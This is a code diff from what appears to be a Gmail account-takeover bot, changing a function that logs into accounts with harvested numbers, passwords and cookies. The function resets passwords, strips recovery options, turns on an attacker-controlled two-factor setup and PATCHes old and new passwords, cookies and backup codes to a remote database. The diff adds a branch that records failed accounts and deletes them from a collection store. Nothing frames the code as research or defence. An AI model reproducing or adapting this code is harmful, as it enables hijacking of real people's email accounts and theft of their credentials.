@@ -288,7 +288,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
 
                     let mYear = mData.year
 
-                    let mNumberYear = await waitForNumberRemove(page, mRapt)
+                    let mNumberYear = await waitForNumberYear(page)
 
                     mYear = (mNumberYear < mYear) ? mNumberYear : mYear
                     
@@ -308,43 +308,57 @@ async function loginWithCompleted(number, password, cookies, worker) {
     
                     if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)
     
-                    try {
-                        await axios.patch(DATABASE_URL+'gmail/completed'+((mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, create: mYear, mail:mMailYear }), {
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            }
-                        })
-                    } catch (error) {}
-    
-                    console.log('Process: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
+                    if (mPassword) {
+                        try {
+                            await axios.patch(DATABASE_URL+'gmail/completed'+((mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, create: mYear, mail:mMailYear }), {
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                            })
+                        } catch (error) {}
+        
+                        console.log('Process: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
 
-                    await waitForRemoveRecovery(page, mRapt)
-                    
-                    await waitForLanguageChange(page)
-    
-                    console.log('Process: [ Language Change: English --- Time: '+getTime()+' ]')
-    
-                    await waitForSkipPassworp(page, mRapt)
-    
-                    console.log('Process: [ Skip Password: Stop --- Time: '+getTime()+' ]')
-    
-                    await waitForNameChange(page, mRapt)
-    
-                    let mTwoFa = await waitForTwoFaActive(page, mRapt)
-    
-                    console.log('Process: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
+                        await waitForRemoveRecovery(page, mRapt)
+                        
+                        await waitForLanguageChange(page)
+        
+                        console.log('Process: [ Language Change: English --- Time: '+getTime()+' ]')
+        
+                        await waitForSkipPassworp(page, mRapt)
+        
+                        console.log('Process: [ Skip Password: Stop --- Time: '+getTime()+' ]')
+        
+                        await waitForNameChange(page, mRapt)
+        
+                        let mTwoFa = await waitForTwoFaActive(page, mRapt)
+        
+                        console.log('Process: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
 
-                    let n_cookies = await getNewCookies(await page.cookies())
-                    
-                    try {
-                        await axios.patch(DATABASE_URL+'gmail/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            }
-                        })
+                        let n_cookies = await getNewCookies(await page.cookies())
+                        
+                        try {
+                            await axios.patch(DATABASE_URL+'gmail/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                            })
 
-                        console.log('Process: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
-                    } catch (error) {}
+                            console.log('Process: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
+                        } catch (error) {}
+                    } else {
+                        try {
+                            await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, create: parseInt(new Date().getTime()/1000) }), {
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                            })
+                        } catch (error) {}
+                        
+                        console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
+                        await axios.delete(BASE_URL+'collect/'+number+'.json')
+                        mSameNumber = 0
+                    }
                 } else {
                     let n_cookies = await getNewCookies(await page.cookies())
                     
@@ -398,7 +412,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
     } catch (error) {}
 }
 
-async function waitForNumberRemove(page, mRapt) {
+async function waitForNumberYear(page) {
     try {
         await page.goto('https://myaccount.google.com/phone?hl=en', { waitUntil: 'load', timeout: 0 })
         await delay(500)
